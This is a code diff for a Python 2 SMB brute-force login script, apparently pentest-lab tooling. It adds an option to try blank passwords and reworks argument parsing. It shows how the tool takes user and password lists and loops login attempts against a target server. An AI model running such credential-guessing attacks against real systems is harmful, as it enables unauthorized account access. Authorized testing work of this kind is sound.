@@ -12,7 +12,7 @@ from threading import Thread
 import sys
 from random import choice
 from string import ascii_letters, digits
-from list_targets import arg_parser, print_success, print_failure
+from resources.pts import arg_parser, print_success, print_failure
 
 def banner():
     print """
@@ -33,6 +33,7 @@ Login:
 Options:
     -t      max thread count (default=2)
     -x      try username as password
+    -b      try blank password
 
 Usage:
     python smb_login.py -u admin -P pass.txt 10.11.1.1
@@ -61,23 +62,26 @@ def main():
     if "-h" in sys.argv or len(sys.argv) == 1: banner()
 
     server = sys.argv[-1]
-    max_threads = arg_parser(name='max threads', flag='-t', type=int, default=2)
-    domain = arg_parser(name='domain', flag='d', type=str, default=None)
+    max_threads = arg_parser(flag='-t', type='int', default=2)
+    domain = arg_parser(flag='-d', type='str', default="null")
 
     if "-U" in sys.argv:
-        users = arg_parser(name='user', flag='-U', type=file, default=False)
+        users = arg_parser(flag='-U', type='file', default=False)
     else:
-        users = arg_parser(name='user', flag='-u', type=list, default=False)
+        users = arg_parser(flag='-u', type='list', default=False)
 
     if "-P" in sys.argv:
-        passwds = arg_parser(name='password', flag='-P', type=file, default=False)
+        passwds = arg_parser(flag='-P', type='file', default=False)
     else:
-        passwds = arg_parser(name='password', flag='-p', type=list, default=None)
+        passwds = arg_parser(flag='-p', type='list', default='null')
 
     print "\n[*] Starting SMB brute force\n", "-"*29
     if "-x" in sys.argv:
         for u in users:
             smb_login(server,domain,u,u)
+
+    if "-b" in sys.argv:
+        passwds.append("")
 
     for u in users:
         count = 0
